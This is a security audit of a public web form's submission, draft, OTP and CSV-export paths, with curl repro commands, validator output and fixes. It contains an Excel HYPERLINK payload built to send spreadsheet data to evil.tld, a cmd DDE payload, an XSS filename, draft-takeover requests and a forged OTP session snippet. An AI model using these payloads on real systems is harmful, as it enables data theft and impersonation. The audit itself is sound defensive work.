# Public form: what a respondent can tamper with

A review of everything an end user can change between their browser and the
database, done by reading the request path and running the real validator
against forged payloads. Every "Proved" block below is output from
`backend/src/lib/validation.ts` itself, not a guess.

---

## The one rule that explains most of this

The server re-validates **answers**. It does not re-validate **facts about
answers**.

`validateSubmission` is genuinely good at the first job: it throws away field
IDs that are not in the published schema, re-evaluates `showWhen` so hidden
answers cannot be forged, re-runs every inspector rule, and re-checks option
values against the branch that was actually on screen. A respondent cannot
invent a field, cannot answer a question that was hidden from them, and cannot
select an option that was never offered.

But wherever an answer is a *description of something else* — a file's size, a
document's owner, who is submitting — the description arrives as JSON from the
browser and is believed. That is where all the high-severity findings live.

---

## 1. File uploads are entirely self-reported — CRITICAL (FIXED)

`backend/src/lib/validation.ts:314-346`

The file checks read `f.size`, `f.mimeType` and `f.filename` **out of the
request body**. The bytes live in DMS, uploaded directly from the browser to a
pre-signed URL, and nothing ever reconciles the two.

### 1a. Lie about the size and type

```bash
curl -X POST https://api.example.com/api/submissions \
  -H 'Content-Type: application/json' \
  -d '{
    "formId": "<published form id>",
    "data": { "cv": [{
      "documentId": "doc_the_900mb_exe_i_actually_uploaded",
      "filename": "cv.pdf",
      "mimeType": "application/pdf",
      "size": 1024
    }] }
  }'
```

The field is configured `accept: ['.pdf']`, `maxSize: 2` (MB).

**Proved:**
```
### B. 900 MB .exe declared as a 1 KB PDF
  accepted : true
  errors   : {}
  stored   : {"cv":[{"documentId":"doc_evil","filename":"cv.pdf", ... "size":1024}]}
```

The DMS `public-initiate` endpoint (`dms.controller.ts:122-146`) checks size and
MIME too — but against the **same client-supplied numbers**, before a single
byte is uploaded. Declare 1 KB, receive a pre-signed URL, upload 900 MB.
Nothing measures what arrived.

### 1b. Skip file validation completely by sending a string

`validation.ts:326` — `if (typeof f !== 'object' || !f) continue;`

A non-object is skipped rather than rejected.

```bash
-d '{ "formId":"...", "data": { "cv": "anything at all" } }'
```

**Proved:**
```
### C. File value sent as a bare string
  accepted : true
  errors   : {}
  stored   : {"cv":"anything at all"}
```

### 1c. A file field with no `fileConfig` has no validation at all

`validation.ts:314` — `if (field.type === 'file' && field.fileConfig)`. Older
forms, or any field where the inspector never wrote a config, get nothing.

**Proved:**
```
### D. File field without fileConfig
  accepted : true
  stored   : {"photo":[{"filename":"shell.php","mimeType":"application/x-php","size":999999999}]}
```

### 1d. Attach a document belonging to another tenant

`documentId` never appears in `validation.ts` or `submission.service.ts`. It is
never checked against the documents DMS issued for *this* form.

**Proved:**
```
### E. Claiming another org's documentId
  accepted : true
  stored   : {"cv":[{"documentId":"doc_belonging_to_another_tenant", ...}]}
```

Whoever later opens that submission gets a download URL minted for a document
they should never see. The authenticated download path *does* check the org
(`dms.controller.ts:213-220`), so the blast radius depends on which path the
viewer uses — but the cross-tenant reference is stored either way.

**Fix.** After upload completes, ask DMS for the document and trust *its*
metadata, not the browser's: confirm `metadata.formId` matches, confirm
`metadata.fieldId` matches, and take size and content type from the DMS record.
Reject a file value that is not an object. Apply the form-level policy
(`formPolicy.ts` already has `DMS_DEFAULT_MAX_FILE_SIZE_MB`) when `fileConfig`
is absent, rather than skipping.

---

## 2. Anyone can read anyone's saved draft — CRITICAL (FIXED)

`backend/src/routes/draft.routes.ts` — no `authMiddleware`, no rate limiter.
`backend/src/controllers/express/draft.controller.ts:10`

The "identity" that scopes a draft is the respondent's **email address**, taken
straight from the query string (`PublicFormPage.tsx:617` — `authEmail || authPhone`).

```bash
# Read a colleague's half-finished application
curl "https://api.example.com/api/drafts/<formId>?identity=victim@company.com"

# Overwrite it
curl -X POST https://api.example.com/api/drafts \
  -H 'Content-Type: application/json' \
  -d '{"formId":"<formId>","identity":"victim@company.com","data":{"salary":"1"}}'

# Delete it
curl -X DELETE "https://api.example.com/api/drafts/<formId>?identity=victim@company.com"
```

There is no secret in that request. Knowing someone's email address is the
entire authorisation check.

The form has an OTP gate in front of it, but it is enforced **only in the
browser** — `authStep === 'done'` lives in `sessionStorage.form_auth_<formId>`
(`PublicFormPage.tsx:700-710`). The drafts API has no idea it exists.

**Fix.** The draft key must be a server-issued, unguessable token bound to the
verified OTP session, stored in an httpOnly cookie — not the email. Same for
`surveySessionToken`, which the client currently chooses for itself
(`submission.service.ts:23`, `z.string().min(32).max(256)`): pick `"a".repeat(32)`
and you can overwrite another respondent's in-progress survey.

---

## 3. `check-unique` is a public membership oracle — HIGH (FIXED)

`backend/src/routes/submission.routes.ts:24` (no auth)
`backend/src/service/submission.service.ts:207`

```bash
curl -X POST https://api.example.com/api/submissions/check-unique \
  -H 'Content-Type: application/json' \
  -d '{"formId":"<formId>","fieldId":"email","value":"ceo@rival.com"}'
# {"isUnique": false}   ← that person applied
```

For a recruitment form, a whistleblower form, a medical intake form, "has this
person submitted?" is often the most sensitive bit in the system, and it is
answerable by anyone with the public link.

There is a second problem in the same six lines: it loads **every submission
for the form** on every call and scans them in Node. One cheap request costs
O(total submissions). At 100 requests per 15 minutes per IP (`index.ts:34-38`,
in-memory so it is really *per replica*), a small botnet turns a public endpoint
into a database amplifier.

**Fix.** Return the answer only for a verified session, or drop the endpoint and
let the submit-time uniqueness check report the collision. Either way, make it a
`SELECT ... LIMIT 1` against an indexed column instead of a full table scan.

---

## 4. Unique fields are check-then-write, with no constraint behind them — HIGH (FIXED)

`backend/src/service/submission.service.ts:132-141`

```
read all submissions  →  is this email already used?  →  no  →  insert
```

Two requests interleaved between the read and the insert both see "no".

```bash
# Both land inside the same millisecond; both succeed
for i in 1 2 3 4 5; do
  curl -X POST .../api/submissions \
    -d '{"formId":"F","data":{"email":"one.per.person@x.com"}}' &
done; wait
```

Compare this with how voting is handled twenty lines below: `claimVote` relies
on a real `@@unique([formId, identifier])` constraint and deletes the row if the
claim loses. That is the correct pattern, and the comment above it says so. The
unique-field path never got the same treatment.

**Fix.** A `SubmissionUniqueValue(formId, fieldId, valueHash)` table with a
unique constraint, claimed in the same transaction as the insert. The read stays
as a fast, friendly pre-check; the constraint is the guarantee.

---

## 5. Sanitising stops at the first level — MEDIUM

`backend/src/lib/validation.ts:21-31`

```ts
if (typeof val === 'string') return xss(val.trim());
if (Array.isArray(val)) return val.map(v => typeof v === 'string' ? xss(v) : v);
return val;                      // ← objects pass through untouched
```

**Proved:**
```
### G. normalizeValue depth
  top-level string : &lt;script&gt;x&lt;/script&gt;      ← sanitised
  array of strings : ["&lt;script&gt;x&lt;/script&gt;"]  ← sanitised
  nested object    : {"a":"<script>x</script>"}        ← NOT sanitised
```

Which real answers are objects? File values, `likert` matrices, `table` rows —
and the array branch only sanitises string *elements*, so an array of file
objects is untouched:

```
### F. Script tag: top-level string vs nested filename
  stored : {"name":"<img src>",                                  ← cleaned
            "cv":[{"filename":"<img src=x onerror=alert(1)>.pdf" ← raw
```

React escapes on render, so this is not stored XSS today. It becomes one the
moment any of that reaches `dangerouslySetInnerHTML`, a PDF renderer, or an
email template. Storing unsanitised input and relying on every future consumer
to escape is the assumption that fails eventually.

**Fix.** Make `normalizeValue` recurse into objects and array elements, with a
depth cap.

---

## 6. CSV export has no formula-injection guard — MEDIUM (FIXED)

`backend/src/service/submission.service.ts:413-427`

Quotes are doubled correctly, but a value beginning with `=`, `+`, `-` or `@` is
still a live formula when Excel parses the quoted field.

```
Answer to "Your comments":
=HYPERLINK("https://evil.tld/?x="&A1&A2&A3,"Click for your refund")
```

The respondent types that into a public form. A staff member exports responses
and opens the file. Excel builds a link containing other respondents' data and
one click exfiltrates it. `cmd|' /C calc'!A0` is the other classic.

**Fix.** Prefix a leading `'` when a value starts with `= + - @ TAB CR`.

---

## 7. An unauthenticated caller can spend the org's API credentials — MEDIUM (FIXED)

`backend/src/routes/submission.routes.ts:25` → `submission.service.ts:445`

`POST /api/submissions/check-external` is public. It loads the field's
`externalValidation` config — which includes the org's stored **bearer token,
basic-auth password, or custom API key** — and makes an outbound request.

`formData` comes from the request body, and `param.type === 'field'` copies
values out of it into the outbound payload (`submission.service.ts:467`). So the
caller partially controls the body of a request sent *by your server*, *with your
customer's credentials*, to your customer's endpoint.

```bash
curl -X POST .../api/submissions/check-external \
  -d '{"formId":"F","fieldId":"pan","value":"X","formData":{"anything":"attacker chosen"}}'
```

No login, no CAPTCHA, no per-form budget. Enough volume and the org's third-party
quota is burned or their rate limit trips.

**Fix.** Require a verified Turnstile token or an OTP-backed session for
external validation, and budget it per form per hour.

---

## 8. Turnstile is on by default, but one settings write turns it off — LOW

`backend/src/lib/formPolicy.ts:19-21` — `settings?.botProtection !== false`.

The default is safe (absent means on). Worth knowing that everything above is
reachable *with* Turnstile enabled, though: Turnstile proves a human was present
once, not that the JSON that follows resembles what the form asked for.

---

## 9. 50 MB of JSON is parsed before anything is filtered — LOW

`index.ts:45` sets a 50 MB body limit. `validation.ts:159` iterates
`Object.entries(submittedData)` over *every* key before discarding the unknown
ones. A payload with 500,000 junk keys is fully parsed and iterated to produce an
empty result.

**Fix.** Cap the key count in `CreateSubmissionSchema`, and lower the body limit
on the public submission route specifically — 50 MB is there for authenticated
imports, not for a form post.

---

## 10. Choice fields with no resolvable options accepted anything — CRITICAL (FIXED)

`backend/src/lib/validation.ts:307` (before the fix)

```ts
if (allowed.size > 0 && selected.some((option) => !allowed.has(option))) {
```

The option allow-list **disabled itself when it was empty**. The intent was
"only check when we know the options", but the effect was the opposite of a
security control: the one case where the server could not establish what was
legitimate was the case where it accepted everything.

This is the reported bug. A "State you want to apply for" dropdown accepted the
value `100`, and a "Local Language" dropdown accepted a 43-digit number.

### Why the allow-list came back empty

Four separate ways, all proved against the real validator:

```
rejected                    select WITH options in the schema
ACCEPTED  <-- tamper worked select with options: []
ACCEPTED  <-- tamper worked select with no options key
ACCEPTED  <-- tamper worked select whose cascade source did not match
ACCEPTED  <-- tamper worked radio with options: []
```

The fourth is the likely one in production. When a state list is driven by a
country answer through `fieldLinking.dynamicConfig.options`, a lookup miss falls
back to `field.options`, which for a cascading field is `[]`.

There was also a fifth: `field.dynamicOptions` — the older cascade shape, still
in `types/index.ts:304` — was **never read by the validator at all**. Every form
using it had zero server-side option checking.

### Reproduce

1. Publish a form with a dropdown whose options cascade from another field.
2. Fill it in normally, then open DevTools.
3. `document.querySelector('[name="<fieldId>"]').value = '100'` — or just POST:

```bash
curl -X POST .../api/submissions \
  -H 'Content-Type: application/json' \
  -d '{"formId":"F","data":{"state":"100","language":"1000000000000000000001"}}'
```

Before the fix: `200 OK`. After: `400` with *"State contains an invalid option."*

### The fix

`allowed.size === 0` now **rejects**. This is safe to fail closed on because
options for a choice field always live in the published schema — there is no
runtime API source anywhere in the codebase — so an empty allow-list means the
respondent's own browser had nothing to offer them either. A real respondent
submits nothing and stops at the `isEmpty` check further up; only a forged value
reaches the line. `field.dynamicOptions` is now resolved as well, so the forms
that used it keep working *and* start being checked.

Verified: forged values rejected in all 5 shapes; legitimate answers, matched
cascades, legacy cascades, empty optional fields and multi-selects all still
accepted.

---

## 11. "Locked" steps are locked only in the browser — HIGH

`src/pages/PublicFormPage.tsx:397, 786, 2612`

This is the other half of the report — *"navigates back to edit the entered
details"*.

`lockedSteps` is a `useState<Set<string>>` mirrored into `sessionStorage`.
`lockOnComplete` is stored on the step in the schema
(`backend/src/schemas/form.schema.ts:294`) and the backend **never reads it
again**:

```
$ grep -rn "lockOnComplete\|lockedSteps" backend/src/
backend/src/schemas/form.schema.ts:294:  lockOnComplete: z.boolean().optional(),   ← saving the form only
```

The entire payload arrives in one POST at the end. Nothing tells the server that
step 1 was confirmed twenty minutes ago, so nothing can notice that its values
changed afterwards. Removing a `disabled` attribute in DevTools, or editing
`sessionStorage.form_auth_<formId>`, is enough.

**Proved:** a field frozen by `lockOnComplete` is accepted with any new value,
because the *field* is not `disabled` in the schema — only the *step* is locked,
and only at runtime.

**Fix.** Locking has to leave a server-side record. When a step with
`lockOnComplete` is confirmed, POST that step's answers and get back a token
bound to them. At final submit, the server replaces the locked fields with the
values it stored, or rejects the submission if they differ. The draft mechanism
already stores per-step data — this is the same store with an immutability flag,
not a new subsystem.

Note the related quirk: a field with `disabled: true` in the schema is dropped
silently *and its `required` rule never runs* (`validation.ts:151-162`), so a
required disabled field simply vanishes from the submission.

---

## 12. The OTP is hardcoded to `1234` and verified in the browser — CRITICAL

`src/pages/PublicFormPage.tsx:435-480`

```js
// OTP service integrated later — hardcoded as 1234 for now
setTimeout(() => { ... setAuthStep('email-otp'); }, 800);
...
if (authOtp === '1234') { ... sessionStorage.setItem(AUTH_SESSION_KEY, ...) }
```

There are no OTP routes in the backend at all — `grep -rn "otp" backend/src/routes/`
returns nothing. No code is sent, nothing is verified, and the "verified" state
is a `sessionStorage` key the respondent can write themselves:

```js
sessionStorage.setItem('form_auth_<formId>',
  JSON.stringify({ email: 'anyone@anywhere.com', step: 'done', verifiedAt: Date.now() }));
```

The verified address is then prefilled into the mapped field
(`PublicFormPage.tsx:717-724`) and submitted as an ordinary answer. The server
never compares the submitted email against any verified identity, because it has
never seen one.

The in-code comment shows this is a known stub rather than a mistake — but if a
build with this in it is in front of a security tester, it is the most serious
item in this document, and it is what makes finding #2 (draft IDOR keyed by
email) trivially exploitable.

**Fix.** Real OTP issue/verify endpoints, rate-limited per address and per IP,
with the verified identity held in a server-side session referenced by an
httpOnly cookie. At submit, the server overwrites the mapped email/phone field
from the session rather than trusting the posted value.

---

## Summary

| # | Issue | Severity | Repro cost |
|---|---|---|---|
| # | Issue | Severity | Status |
|---|---|---|---|
| 1 | File size/type/owner are self-reported; `documentId` unbound | Critical | **Fixed** |
| 2 | Drafts keyed by email, no auth — read/write/delete anyone's | Critical | **Fixed** |
| 3 | `check-unique` public membership oracle + O(n) scan | High | **Fixed** |
| 4 | Unique-field TOCTOU, no DB constraint | High | **Fixed** |
| 5 | `normalizeValue` does not recurse into objects | Medium | Open |
| 6 | CSV export lacks formula-injection guard | Medium | **Fixed** |
| 7 | Public `check-external` spends the org's credentials | Medium | **Fixed** |
| 8 | Bot protection is a per-form toggle | Low | Open (by design) |
| 9 | 50 MB body parsed before filtering | Low | Open |
| 10 | Empty option allow-list accepted any value | Critical | **Fixed** |
| 11 | Step `lockOnComplete` enforced only in the browser | High | Open |
| 12 | OTP hardcoded `1234`, verified client-side, no backend | Critical | Open |

The six marked fixed in this round are covered by `docs/PUBLIC_FORM_HARDENING.md`,
which records what changed and the verification each one was held to.

## What is already right

Worth saying, because it is the reason the list is not longer:

- **Field allow-listing** (`validation.ts:151-162`). Unknown keys are dropped, so
  no `isAdmin`, no `score`, no `price` can be injected.
- **`showWhen` re-evaluated server-side** (`:174-181`). Answers to hidden
  questions are deleted, not trusted.
- **Options validated against the active branch** (`:290-310`), not the union of
  every branch — a genuinely subtle thing to get right.
- **Assessment scoring never trusts the client.** `correctAnswer` and `points`
  are stripped from the public payload and the score is computed server-side
  from the stored schema.
- **Voting duplicate prevention** uses a real unique constraint with a
  compensating delete.
- **Turnstile fails closed**, with an action/cdata/hostname check and a replay
  guard.
- **Strict-anonymous surveys** discard IP and user agent at write time.

The pattern is clear: the paths someone deliberately hardened are hard. The gaps
are all in the places where a value was assumed to be descriptive metadata
rather than user input.

## Suggested order of work

1. Bind `documentId` to the form and take size/type from DMS (#1).
2. Replace draft `identity` with a server-issued session token (#2).
3. Add the unique-value constraint table (#4).
4. Gate or remove `check-unique` and `check-external` (#3, #7).
5. Recurse in `normalizeValue`, escape CSV formulas (#5, #6).
